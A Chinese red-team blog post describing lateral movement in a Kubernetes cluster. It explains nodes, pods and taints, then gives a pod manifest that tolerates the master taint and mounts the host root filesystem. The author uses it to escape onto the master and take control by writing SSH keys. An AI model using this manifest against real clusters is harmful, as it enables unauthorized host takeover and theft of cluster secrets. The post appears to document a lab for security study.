TOC

[倾旋的博客](/) [About](/about/) [Posts](/posts/) [Links](/links/)
[Slack](https://join.slack.com/t/pocketcorp/shared_invite/zt-7z7641qt-
nlkK4NGgU5YA_vKPTfr~jA) [RSS](/feed.xml)

# Kubernetes(K8s)横向移动办法

Jul 20, 2021

> 博客半年没写了，来除除草…. :(

## 0x01 Kubernetes 简介

Kubernetes 是一个可移植的、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。 Kubernetes
拥有一个庞大且快速增长的生态系统。Kubernetes 的服务、支持和工具广泛可用。

![2021-07-20-11-19-39](https://rvn0xsy.oss-cn-
shanghai.aliyuncs.com/60ab9641f6ec3ecfec996616ef0837ab.png)

**传统部署时代：**

早期，各个组织机构在物理服务器上运行应用程序。无法为物理服务器中的应用程序定义资源边界，这会导致资源分配问题。
例如，如果在物理服务器上运行多个应用程序，则可能会出现一个应用程序占用大部分资源的情况， 结果可能导致其他应用程序的性能下降。
一种解决方案是在不同的物理服务器上运行每个应用程序，但是由于资源利用不足而无法扩展， 并且维护许多物理服务器的成本很高。

**虚拟化部署时代：**

作为解决方案，引入了虚拟化。虚拟化技术允许你在单个物理服务器的 CPU 上运行多个虚拟机（VM）。 虚拟化允许应用程序在 VM
之间隔离，并提供一定程度的安全，因为一个应用程序的信息 不能被另一应用程序随意访问。

虚拟化技术能够更好地利用物理服务器上的资源，并且因为可轻松地添加或更新应用程序 而可以实现更好的可伸缩性，降低硬件成本等等。

每个 VM 是一台完整的计算机，在虚拟化硬件之上运行所有组件，包括其自己的操作系统。

**容器部署时代：**

容器类似于 VM，但是它们具有被放宽的隔离属性，可以在应用程序之间共享操作系统（OS）。 因此，容器被认为是轻量级的。容器与 VM
类似，具有自己的文件系统、CPU、内存、进程空间等。 由于它们与基础架构分离，因此可以跨云和 OS 发行版本进行移植。

> 以上摘自Kubernetes官方文档：https://kubernetes.io/zh/docs/concepts/overview/what-is-
> kubernetes/

## 0x02 Kubernetes 关键概念介绍

Kubernetes有如下几个与本文相关的概念：

  1. 节点(Node)
  2. Pod
  3. 容忍度(Toleration)与污点(Taint)

### 节点(Node)

Kubernetes 通过将容器放入在节点（Node）上运行的 Pod 中来执行你的工作负载。
节点可以是一个虚拟机或者物理机器，取决于所在的集群配置。最容易理解的例子：

![2021-07-20-10-38-26](https://rvn0xsy.oss-cn-
shanghai.aliyuncs.com/527d6800fc5f0a462b9dc90a1c3908f9.png)

该集群有三个节点，我可以在这三个节点上创建很多个Pod，而Pod中可以包含多个容器。在所有的节点中，至少要有一个Master节点，Master节点是第一个加入集群的机器，它具有整个集群的最高权限，本文的目的就是研究如何通过其他节点，横向移动到Master节点，因为Secret敏感信息(令牌、账户密码、公私钥等等)都存储在Kubernetes的etcd数据库上。

### Pod

Pod是可以在 Kubernetes 中创建和管理的、最小的可部署的计算单元。

Pod（就像在鲸鱼荚或者豌豆荚中）是一组（一个或多个） 容器； 这些容器共享存储、网络、以及怎样运行这些容器的声明。
Pod中的内容总是并置（colocated）的并且一同调度，在共享的上下文中运行。 Pod所建模的是特定于应用的“逻辑主机”，其中包含一个或多个应用容器，
这些容器是相对紧密的耦合在一起的。 在非云环境中，在相同的物理机或虚拟机上运行的应用类似于 在同一逻辑主机上运行的云应用。

Pod的共享上下文包括一组 Linux 名字空间、控制组（cgroup）和可能一些其他的隔离方面，即用来隔离Docker容器的技术。
在Pod的上下文中，每个独立的应用可能会进一步实施隔离。

就Docker概念的术语而言，Pod类似于共享名字空间和文件系统卷的一组Docker容器，也就是说Pod是Docker容器的超集。

### 容忍度(Toleration)与污点(Taint)

Kubernetes可以约束一个 Pod 只能在特定的节点上运行。

节点亲和性 是Pod的一种属性，它使 Pod 被吸引到一类特定的节点 （这可能出于一种偏好，也可能是硬性要求）。
污点（Taint）则相反——它使节点能够排斥一类特定的 Pod。容忍度（Toleration）是应用于 Pod 上的，允许（但并不要求）Pod
调度到带有与之匹配的污点的节点上。 **我们可以控制Pod创建时候的污点来向集群内的节点进行喷射创建。**

## 0x03 环境介绍

当前实验环境有三个节点，其中一个为Master节点，其余的都是普通节点。

![2021-07-20-10-56-11](https://rvn0xsy.oss-cn-
shanghai.aliyuncs.com/fb788c1977b181ed1fcebec421adaee0.png)

当前机器是node1，普通节点，节点全部为健康状态，接下来要利用创建Pod的功能，横向到k8s-master。

## 0x04 利用创建Pod横向移动

  1. 确认Master节点的容忍度

    
    
    $ kubectl describe node <Node Name>
    

![2021-07-20-10-59-50](https://rvn0xsy.oss-cn-
shanghai.aliyuncs.com/4de02e057736c6c005e1a521fc7ad7d7.png)

  1. 创建带有容忍参数的Pod

    
    
    $ kubectl create -f control-master.yaml
    

control-master.yaml内容：

    
    
    apiVersion: v1
    kind: Pod
    metadata:
    name: control-master-3
    spec:
    tolerations:
    - key: node-role.kubernetes.io/master
    operator: Exists
    effect: NoSchedule
    containers:
    - name: control-master-3
    image: ubuntu:18.04
    command: ["/bin/sleep", "3650d"]
    volumeMounts:
    - name: master
    mountPath: /master
    volumes:
    - name: master
    hostPath:
    path: /
    type: Directory
    

![2021-07-20-11-02-18](https://rvn0xsy.oss-cn-
shanghai.aliyuncs.com/a092be4614e40a1c419aeb417f00d5c5.png)

在多次创建Pod后，会发现Pod会在Master节点上出现，再利用kubectl进入容器，执行逃逸。

![2021-07-20-11-06-24](https://rvn0xsy.oss-cn-
shanghai.aliyuncs.com/71842cf8d76f15aa1b04260f2186cf21.png)

至此，逃逸完成，能够通过写公私钥的方式控制Master宿主机。

## 0x05 总结

本文通过了解Kubernetes的一些基本概念，完成了在节点中进行横向逃逸，但我没有实现指定节点的逃逸过程，因为在Kubernetes中低权限的节点无法修改Master节点的容忍度，因此要完成逃逸，需要在每一个节点上至少创建一个Pod，如果集群中节点数量庞大的话….

![倾旋](//avatars0.githubusercontent.com/u/19944759?s=150&v=4)

倾旋

特点：爪子长、个子高、身体瘦弱

[GitHub](https://github.com/Rvn0xsy) [Twitter](https://twitter.com/Rvn0xsy)
[Email](/cdn-cgi/l/email-protection#c3b1b5adf3bbb0ba83a4aea2aaafeda0acae) 微信

Newest Posts

  * [Windows活动目录中的LDAP](/archivers/2021-08-11/1)
  * [Kubernetes(K8s)横向移动办法](/archivers/2021-07-20/1)
  * [Pricking 项目（一） ：使用介绍](/archivers/2021-02-18/1)
  * [Pricking 项目（二） ：JS模块开发](/archivers/2021-02-18/2)
  * [红队技巧：基于反向代理的水坑攻击](/archivers/2021-02-16/1)
  * [CVE-2021-3156 - Exploit修改](/archivers/2021-02-09/1)
  * [静态恶意代码逃逸（第十课）](/archivers/2021-02-08/1)
  * [Windows权限控制相关的防御与攻击技术](/archivers/2021-01-31/1)
  * [静态恶意代码逃逸（第九课）](/archivers/2020-11-29/2)
  * [静态恶意代码逃逸（第八课）](/archivers/2020-11-29/1)
  * [Linux透明代理在红队渗透中的应用](/archivers/2020-11-13/1)
  * [Web正向代理的思考](/archivers/2020-11-01/1)
  * [静态恶意代码逃逸（第七课）](/archivers/2020-10-23/1)
  * [这是一个充满挑战的好时代](/archivers/2020-08-24/1)
  * [通过OXID解析器获取Windows远程主机上网卡地址](/archivers/2020-07-16/1)
  * [更多....](/posts/)

TOC

© 2021 倾旋

